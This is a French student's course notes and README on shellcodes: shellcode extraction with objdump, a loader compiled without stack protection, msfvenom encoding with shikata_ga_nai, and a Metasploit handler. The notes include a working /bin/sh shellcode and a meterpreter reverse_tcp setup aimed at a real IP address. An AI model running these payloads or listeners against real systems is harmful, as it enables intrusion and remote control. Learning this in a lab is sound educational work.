Gaspard PEPIN
ING 3 Cyber Groupe A

Cours sur les shellcodes

Concernant shellcode01.c : 

Pour récupérer le shellcode (très long), j'ai trouvé la commande suivante sur internet utilisant objdump :

objdump -d ./shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'       


Concernant wrapper.c : 

Modifié d'internet, il prend un argument un shellcode qu'il charge en mémoire et l'exécute ensuite.
J'ai du mal à le faire fonctionner même avec des shellcodes très courts.
J'en ai donc trouvé un plus simple mais qui ne fonctionne pas.
Et on le compile avec :
gcc wrapper.c -o wrapper -fno-stack-protector -z execstack

exemple de lancement (ouverture bin/sh) :
./wrapper $(python2 -c 'print("\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")')

Concernant asm32 et asm64 :

Compilable avec ./build.sh < asmX >
Lancement de l'executable avec ./asmX

Afin de voir la valeur des returns, faire echo $?

Pour asm05, il faut avoir asm01 de générer.


Concernant MSF :

Voici les commandes à faire dans le dossier msf pour avoir les shellcodes :

msfvenom -a x86 --platform linux -e x86/shikata_ga_nai -f c -i 2 -o asm01_x86.shellcode < ../asm32/asm01
msfvenom -a x86 --platform linux -e x86/shikata_ga_nai -f c -i 2 -o asm02_x86.shellcode < asm02 
msfvenom -a x86 --platform linux -e x86/shikata_ga_nai -f c -i 2 -o asm03_x86.shellcode < asm03 
msfvenom -a x86 --platform linux -e x86/shikata_ga_nai -f c -i 2 -o asm04_x86.shellcode < asm04 
msfvenom -a x86 --platform linux -e x86/shikata_ga_nai -f c -i 2 -o asm05_x86.shellcode < asm05 
msfvenom -a x86 --platform linux -e x86/shikata_ga_nai -f c -i 2 -o asm06_x86.shellcode < asm06 


Pour les reverseShell et bindShell, il faut faire ces commandes dans le terminale host et lancer l'un des deux prg sur la machine cible.

msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 7777
set LHOST 176.100.43.89
exploit